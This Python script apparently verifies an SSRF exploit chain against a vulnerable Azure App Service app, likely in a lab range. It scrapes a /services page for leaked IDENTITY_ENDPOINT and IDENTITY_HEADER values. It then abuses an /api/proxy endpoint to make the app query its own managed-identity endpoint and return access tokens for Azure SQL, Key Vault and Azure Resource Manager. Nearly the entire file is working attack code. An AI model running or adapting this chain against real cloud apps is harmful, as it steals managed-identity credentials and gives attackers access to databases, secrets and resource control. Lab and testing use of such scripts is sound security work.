#!/usr/bin/env python3
"""
End-to-end verification of the tycho-terminal SSRF chain.

Two surfaces, exploited together:

  1. /services on the webapp dumps process.env as a tidy HTML table --
     leaks IDENTITY_ENDPOINT and IDENTITY_HEADER (the App Service IMDS
     authn pair), which are link-local and unreachable from outside.
  2. /api/proxy on the webapp is a forwarding proxy that takes
     {url, headers} JSON and makes the request from *inside* the App
     Service container. Combined with #1, this lets an external
     attacker make the webapp call its own IMDS and return an MSI
     token for any Azure resource the MI can mint a token for.

This script verifies both surfaces are exploitable and that the MI
issues tokens for the three most useful audiences:
    https://database.windows.net/   (used by the trigger_escalation chain)
    https://vault.azure.net         (used by the Key Vault chain)
    https://management.azure.com/   (ARM control plane)

Reads config from environment variables (also accepts a .env file).
Required:
    WEBAPP_FQDN          e.g. tycho-terminal-xxx.azurewebsites.net

Optional (enables stronger assertions):
    TENANT_ID            asserts each leaked token belongs to this tenant
"""
from __future__ import annotations

import argparse
import base64
import html
import json
import os
import re
import sys
import urllib.request


GREEN, RED, CYAN, YELLOW, RESET = "\033[32m", "\033[31m", "\033[36m", "\033[33m", "\033[0m"
PASS = f"{GREEN}[+]{RESET}"
FAIL = f"{RED}[-]{RESET}"
INFO = f"{CYAN}[*]{RESET}"
WARN = f"{YELLOW}[!]{RESET}"

_fail_count = 0
def expect(cond: bool, msg: str) -> None:
    global _fail_count
    print("    " + (PASS if cond else FAIL) + " " + msg)
    if not cond:
        _fail_count += 1

def step(n: int, title: str) -> None:
    print(f"\n{INFO} {n}) {title}")


def load_dotenv(path: str = ".env") -> None:
    if not os.path.isfile(path):
        return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))


def decode_jwt(token: str) -> dict:
    return json.loads(base64.urlsafe_b64decode(token.split(".")[1] + "==="))


def http_get(url: str, timeout: int = 10) -> str:
    return urllib.request.urlopen(url, timeout=timeout).read().decode("utf-8", errors="replace")


def http_post_json(url: str, body: dict, timeout: int = 15) -> str:
    req = urllib.request.Request(url, data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json"})
    return urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", errors="replace")


def env_from_services_page(webapp_base: str) -> tuple[str | None, str | None]:
    page = http_get(webapp_base + "/services")
    def grab(key: str) -> str | None:
        m = re.search(r"<td><code>" + re.escape(key) +
                      r"</code></td>\s*<td><code>([^<]+)</code></td>", page)
        return html.unescape(m.group(1)) if m else None
    return grab("IDENTITY_ENDPOINT"), grab("IDENTITY_HEADER")


def ssrf_for_token(webapp_base: str, ident_endpoint: str, ident_header: str, resource: str) -> str:
    """Use /api/proxy to make the webapp call its own IMDS for a token."""
    resp = http_post_json(
        webapp_base + "/api/proxy",
        {"url": f"{ident_endpoint}?resource={resource}&api-version=2019-08-01",
         "headers": f"X-IDENTITY-HEADER: {ident_header}"},
    )
    m = re.search(r'"access_token":\s*"([^"]+)"', resp)
    if not m:
        raise RuntimeError(f"could not extract access_token from /api/proxy response for {resource}")
    return m.group(1)


def main() -> int:
    load_dotenv()
    argparse.ArgumentParser(description=__doc__,
                            formatter_class=argparse.RawDescriptionHelpFormatter).parse_args()

    fqdn = os.environ.get("WEBAPP_FQDN", "").strip()
    if fqdn.startswith("https://"): fqdn = fqdn[len("https://"):]
    if fqdn.startswith("http://"):  fqdn = fqdn[len("http://"):]
    fqdn = fqdn.rstrip("/")
    expected_tenant = os.environ.get("TENANT_ID", "").strip() or None
    if not fqdn:
        print(f"{FAIL} WEBAPP_FQDN is required (env or .env)", file=sys.stderr)
        return 2
    webapp = "https://" + fqdn

    # ---- 1. env-leak surface ----
    step(1, "Scrape /services for IMDS env vars")
    ie, ih = env_from_services_page(webapp)
    print(f"    IDENTITY_ENDPOINT = {ie}")
    print(f"    IDENTITY_HEADER   = {ih}")
    expect(bool(ie and ie.startswith("http://")), "IDENTITY_ENDPOINT leaked")
    expect(bool(ih and len(ih) >= 32),             "IDENTITY_HEADER leaked")
    # Sanity: IDENTITY_ENDPOINT should resolve to a link-local IPv4 (169.254.x.x)
    if ie:
        m = re.match(r"http://(\d+\.\d+\.\d+\.\d+):", ie)
        expect(bool(m and m.group(1).startswith("169.254.")),
               "IDENTITY_ENDPOINT points to link-local (169.254.x.x) -- unreachable except via SSRF")

    if not (ie and ih):
        print(f"\n{FAIL} cannot continue without IMDS env vars")
        return 1

    # ---- 2. SSRF for tokens against three audiences ----
    # Some Azure services (notably Key Vault) return the `aud` claim as the
    # first-party application GUID rather than the URL form, depending on
    # IMDS API version. We accept either.
    AUD_ALIASES = {
        "https://vault.azure.net": {"https://vault.azure.net",
                                    "cfa8b339-82a2-471a-a3c9-0fc0be7a4093"},
    }
    def aud_matches(actual: str, requested: str) -> bool:
        accept = AUD_ALIASES.get(requested.rstrip("/"), {requested.rstrip("/")})
        return actual.rstrip("/") in accept

    targets = [
        ("database.windows.net",  "https://database.windows.net/"),
        ("vault.azure.net",       "https://vault.azure.net"),
        ("management.azure.com",  "https://management.azure.com/"),
    ]
    tokens: dict[str, dict] = {}
    for short, resource in targets:
        step(2, f"SSRF /api/proxy -> IMDS for {short} token")
        try:
            tok = ssrf_for_token(webapp, ie, ih, resource)
        except Exception as e:
            print(f"    {FAIL} SSRF failed: {e}")
            _fail_count_inc()
            continue
        p = decode_jwt(tok)
        print(f"    aud={p.get('aud')}  appid={p.get('appid')}  oid={p.get('oid')}  tid={p.get('tid')}")
        expect(aud_matches(p.get("aud", ""), resource),
               f"JWT aud matches requested resource ({resource})")
        if expected_tenant:
            expect(p.get("tid") == expected_tenant, "JWT tid matches expected tenant")
        tokens[short] = p

    # ---- 3. All tokens belong to the same MI ----
    step(3, "All tokens originate from the same managed identity")
    appids = {p.get("appid") for p in tokens.values() if p}
    oids   = {p.get("oid")   for p in tokens.values() if p}
    print(f"    distinct appids: {appids}")
    print(f"    distinct oids:   {oids}")
    expect(len(appids) == 1, "all SSRF tokens share one appid")
    expect(len(oids)   == 1, "all SSRF tokens share one oid")

    # ---- 4. The MI looks like the webapp's MI (not something else) ----
    if tokens:
        step(4, "JWT identifies the webapp managed identity")
        sample = next(iter(tokens.values()))
        mirid = sample.get("xms_mirid", "")
        print(f"    xms_mirid = {mirid}")
        expect("Microsoft.Web/sites/" in mirid,
               "xms_mirid points at a Microsoft.Web/sites/* resource (App Service MI)")
        if fqdn.startswith("tycho-terminal-"):
            expect(fqdn.split(".")[0] in mirid,
                   "xms_mirid resource name matches WEBAPP_FQDN")

    print()
    if _fail_count == 0:
        print(f"{GREEN}=== SSRF chain: PASS ==={RESET}")
        return 0
    print(f"{RED}=== {_fail_count} CHECK(S) FAILED ==={RESET}")
    return 1


def _fail_count_inc() -> None:
    global _fail_count
    _fail_count += 1


if __name__ == "__main__":
    sys.exit(main())
